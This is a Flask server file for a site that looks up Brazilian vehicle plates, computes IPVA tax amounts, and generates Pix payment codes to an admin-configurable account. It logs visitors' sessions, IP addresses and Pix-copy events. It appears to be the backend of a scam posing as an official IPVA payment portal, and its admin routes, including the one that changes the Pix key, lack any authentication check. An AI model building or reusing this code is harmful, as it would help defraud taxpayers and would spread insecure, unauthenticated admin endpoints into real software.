from flask import Flask, request, jsonify, send_file, send_from_directory
import json
import os
from plate_calculator import calculate_ipva_data
from pix_utils import generate_pix_payload
from config import PIX_KEY, PIX_NAME, PIX_CITY, PIX_DESCRIPTION
import admin_data_manager as adm
import admin_auth
from session_tracker import tracker
import meta_pixel
import uuid
from order_manager import order_manager

app = Flask(__name__, static_folder='.', static_url_path='')

# Serve HTML pages
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/admin.html')
def admin():
    return send_from_directory('.', 'admin.html')

@app.route('/admin_new.html')
def admin_new():
    return send_from_directory('.', 'admin_new.html')

@app.route('/resultado.html')
def resultado():
    return send_from_directory('.', 'resultado.html')

# API Endpoints
@app.route('/api/admin/stats')
def get_admin_stats():
    try:
        stats = adm.get_stats()
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/config', methods=['GET', 'POST'])
def admin_config():
    if request.method == 'GET':
        try:
            config = adm.get_config()
            return jsonify(config)
        except Exception as e:
            return jsonify({"error": str(e)}), 500
    else:
        try:
            data = request.json
            adm.save_config(data.get('pix_key'), data.get('pix_name'), data.get('pix_city'))
            return jsonify({"success": True})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route('/api/get_pixel_code')
def get_pixel_code():
    try:
        pixel_code = meta_pixel.get_pixel_code()
        return pixel_code, 200, {'Content-Type': 'text/html'}
    except Exception as e:
        return str(e), 500

@app.route('/api/admin/get_pixel_config')
def get_pixel_config():
    try:
        config = meta_pixel.get_pixel_config()
        return jsonify(config)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_orders')
def get_orders():
    try:
        orders = order_manager.get_all_orders()
        stats = order_manager.get_stats()
        return jsonify({"orders": orders, "stats": stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/get_sessions')
def get_sessions():
    try:
        return jsonify({
            "online_users": tracker.get_online_users(),
            "stats": tracker.get_stats()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/health')
def health_check():
    print("DEBUG: Health check called", flush=True)
    return jsonify({"status": "ok", "message": "Server is running"}), 200

@app.route('/api/calculate_ipva', methods=['POST'])
def calculate_ipva():
    print("DEBUG: Received request for /api/calculate_ipva", flush=True) # Force flush
    try:
        data = request.json
        plate = data.get('plate')
        print(f"DEBUG: Processing plate: {plate}", flush=True)
        
        if not plate:
            return jsonify({"error": "Plate required"}), 400
        
        result = calculate_ipva_data(plate)
        
        if 'error' not in result:
            adm.log_consulta(
                result.get('plate', plate),
                result.get('brand', 'Unknown'),
                result.get('ipva_full', 'R$ 0,00')
            )
            
            session_id = str(uuid.uuid4())
            order = order_manager.create_order(
                session_id=session_id,
                vehicle_data=result,
                payment_data={
                    'ipva_full': result.get('ipva_full'),
                    'ipva_discounted': result.get('ipva_discounted'),
                    'licensing_val': result.get('licensing_val'),
                    'installment_val': result.get('installment_val'),
                    'first_payment_total': result.get('first_payment_total')
                }
            )
            
            result['session_id'] = session_id
            result['order_id'] = order['order_id']
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/generate_pix', methods=['POST'])
def generate_pix():
    try:
        data = request.json
        amount = float(data.get('amount'))
        plate = data.get('plate', 'Unknown')
        
        if not amount:
            return jsonify({"error": "Amount required"}), 400
        
        config = adm.get_config()
        pix_key = config.get('pix_key', PIX_KEY)
        pix_name = config.get('pix_name', PIX_NAME)
        pix_city = config.get('pix_city', PIX_CITY)
        
        name = pix_name[:25]
        city = pix_city[:15]
        
        pix_code = generate_pix_payload(pix_key, name, city, amount)
        
        adm.log_pix(plate, f"R$ {amount:.2f}", pix_code)
        
        session_id = data.get('session_id')
        if session_id:
            order_manager.mark_pix_generated(session_id, pix_code)
        
        return jsonify({"payload": pix_code})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    try:
        data = request.json
        if admin_auth.verify_login(data.get('username'), data.get('password')):
            token = admin_auth.create_session(data.get('username'))
            return jsonify({"token": token})
        else:
            return jsonify({"error": "Invalid credentials"}), 401
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/track_session', methods=['POST'])
def track_session():
    try:
        data = request.json
        session_id = data.get('session_id') or str(uuid.uuid4())
        tracker.create_or_update_session(
            session_id, data.get('stage'), data.get('utm_source'),
            request.remote_addr, data.get('plate')
        )
        return jsonify({"session_id": session_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/track_pix_copy', methods=['POST'])
def track_pix_copy():
    try:
        data = request.json
        session_id = data.get('session_id')
        
        if session_id:
            tracker.mark_pix_copied(session_id)
            order_manager.mark_pix_copied(session_id)
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/admin/save_pixel', methods=['POST'])
def save_pixel():
    try:
        data = request.json
        meta_pixel.save_pixel_config(data.get('pixel_id'), data.get('enabled', True))
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    PORT = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=PORT, debug=False)
